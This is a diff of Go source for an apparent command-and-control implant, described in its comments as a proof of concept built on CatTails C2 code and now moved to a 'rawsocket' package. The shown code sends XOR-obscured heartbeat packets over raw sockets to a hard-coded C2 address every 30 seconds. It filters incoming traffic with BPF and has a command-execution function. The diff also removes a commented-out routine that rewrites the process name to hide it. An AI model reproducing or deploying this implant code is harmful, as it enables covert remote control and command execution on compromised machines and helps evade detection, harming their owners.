@@ -1,10 +1,10 @@
 package main
 
 /*
-Working on C2, Currently using Cattails C2 source as POC.
+Working on C2, Currently using rawsocket C2 source as POC.
 Additional functionality and code edits will be made in the future.
 
-Look at the github repo for Cattails for more information :3
+Look at the github repo for rawsocket for more information :3
 */
 
 import (
@@ -18,38 +18,25 @@ import (
 	"time"
 
 	"github.com/google/gopacket"
-	"github.com/oneNutW0nder/CatTails/cattails"
 	"golang.org/x/sys/unix"
 )
 
 var lastCmdRan string
 
-// func HideName(pname string) {
-// argv0str := (*reflect.StringHeader)(unsafe.Pointer(&os.Args[0]))
-// argv0 := (*[1 << 30]byte)(unsafe.Pointer(argv0str.Data))[:argv0str.Len]
-
-// n := copy(argv0, pname)
-// if n < len(argv0) {
-// for i := n; i < len(argv0); i++ {
-// argv0[i] = 0
-// }
-// }
-// }
-
 func generateHeartbeat(iface *net.Interface, src net.IP, dst net.IP, dstMAC net.HardwareAddr) {
 	for {
-		fd := cattails.NewSocket()
+		fd := rawsocket.NewSocket()
 		defer unix.Close(fd)
 
 		// Create Cmd -> Encrypt -> Wrap with Identifier
-		data := cattails.CreateHello(iface.HardwareAddr, src)
+		data := rawsocket.CreateHello(iface.HardwareAddr, src)
 		data = rawsocket.XORCipher(data)
 		data = rawsocket.AddIdentifier(data, true)
 
 		// Send Packet
-		packet := cattails.CreatePacket(iface, src, dst, 18000, 56969, dstMAC, data)
-		addr := cattails.CreateAddrStruct(iface)
-		cattails.SendPacket(fd, iface, addr, packet)
+		packet := rawsocket.CreatePacket(iface, src, dst, 18000, 56969, dstMAC, data)
+		addr := rawsocket.CreateAddrStruct(iface)
+		rawsocket.SendPacket(fd, iface, addr, packet)
 
 		fmt.Println("[+] Sent HELLO")
 		time.Sleep(30 * time.Second)
@@ -102,19 +89,19 @@ func execCommand(command string) {
 }
 
 func main() {
-	/* Cattails Init */
+	/* rawsocket Init */
 	// Create BPF filter vm
-	vm := cattails.CreateBPFVM(cattails.FilterRaw)
+	vm := rawsocket.CreateBPFVM(rawsocket.FilterRaw)
 
 	// Create reading socket
-	readfd := cattails.NewSocket()
+	readfd := rawsocket.NewSocket()
 	defer unix.Close(readfd)
 	fmt.Println("[+] Socket created")
 
 	// Get information that is needed for networking
-	iface, src := cattails.GetOutwardIface("192.168.1.202:8000")
+	iface, src := rawsocket.GetOutwardIface("192.168.1.202:8000")
 
-	dstMAC, err := cattails.GetRouterMAC()
+	dstMAC, err := rawsocket.GetRouterMAC()
 	if err != nil {
 		log.Fatal(err)
 	}
